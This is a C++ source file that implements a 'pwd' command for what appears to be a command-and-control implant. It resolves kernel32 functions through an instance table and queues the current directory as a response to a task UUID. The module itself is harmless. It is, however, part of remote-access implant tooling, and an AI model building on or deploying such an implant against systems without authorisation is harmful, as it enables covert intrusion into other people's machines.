#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_PWD

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_pwd(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    wchar_t dir_w[520] = { 0 };
    inst.kernel32.GetCurrentDirectoryW( 520, dir_w );

    char dir[520] = { 0 };
    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, dir_w, -1, dir, 520, nullptr, nullptr );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, dir );
}

#endif
